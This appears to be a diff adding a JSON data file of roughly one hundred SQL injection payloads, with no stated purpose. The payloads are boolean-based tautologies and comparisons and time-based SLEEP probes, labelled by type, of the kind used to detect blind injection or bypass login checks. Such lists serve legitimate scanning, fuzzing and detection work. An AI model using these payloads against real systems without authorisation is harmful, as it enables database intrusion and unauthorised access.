@@ -1,0 +1,402 @@
+[
+  {
+    "payload": "1' AND 3>2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' OR 'a'='a' -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 3<>4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "2' AND SLEEP(4) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "3' AND SLEEP(5) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "5' AND 4>3 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "3' AND 1=1 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND SLEEP(5) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "5' AND 5<>6 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "5' AND 3>2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 5<>6 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "2' AND 3>2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 5<6 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND ASCII('A')=65 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "5' AND 1<>2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "5' AND 5>4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 3<4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "3' AND 3<>4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 'c'!='d' -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "5' AND SLEEP(3) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "2' AND SLEEP(2) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "4' AND 2>1 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "3' AND 1<>2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "3' AND 4>=3 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "4' AND 2>=1 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 4<>5 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "5' AND 6>=5 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "4' AND 5<6 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND ASCII('B')>65 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 5>4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND ASCII('B')=66 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 2>=1 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND LENGTH('hello')=5 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "2' AND 2>=1 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "2' AND 1<>2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 4>=3 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "4' AND 4<5 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "5' AND SLEEP(5) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "2' AND 3<4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "4' AND 2=2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "3' AND 2>1 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 'x'<>'y' -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 'y'!='z' -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 2>1 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "5' AND 1<2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "3' AND SLEEP(4) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "2' AND 4=4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "5' AND 5<6 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "3' AND SLEEP(3) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "3' AND 2>=1 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "3' AND 5<6 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "4' AND 3>=2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' OR 'b'='b' -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 3=3 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND LENGTH('a')=1 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "3' AND 2<>3 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "3' AND 1<2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "2' AND 1<2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "4' AND 1<2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' OR 'x'='x' -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND LENGTH('abc')=3 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "3' AND SLEEP(2) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "5' AND 2>=1 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND ASCII('C')=67 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "4' AND SLEEP(5) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "5' AND 3<>4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND SLEEP(4) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "1' AND ASCII('C')>66 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "2' AND SLEEP(5) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "4' AND SLEEP(3) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "4' AND 5<>6 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 2=2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND ASCII('c')>98 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "2' AND 5<6 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND 5=5 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "4' AND SLEEP(4) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "1' AND SLEEP(3) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "4' AND 4=4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "2' AND 5=5 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND LENGTH('abc')>2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "5' AND 2<3 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "4' AND 3<4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "5' AND SLEEP(2) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "5' AND 5>=4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "2' AND 3<>4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "4' AND 5>=4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "5' AND 3>=2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "4' AND SLEEP(2) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "5' AND SLEEP(4) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "5' AND 4>=3 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "3' AND 2=2 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "4' AND 3<>4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "5' AND 3<4 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND ASCII('D')>67 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "2' AND SLEEP(3) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "1' AND SLEEP(2) -- -",
+    "type": "time"
+  },
+  {
+    "payload": "1' AND 'x'!='y' -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' OR 'c'='c' -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "1' AND ASCII('d')>99 -- -",
+    "type": "boolean"
+  },
+  {
+    "payload": "3' AND 4<5 -- -",
+    "type": "boolean"
+  }
+]
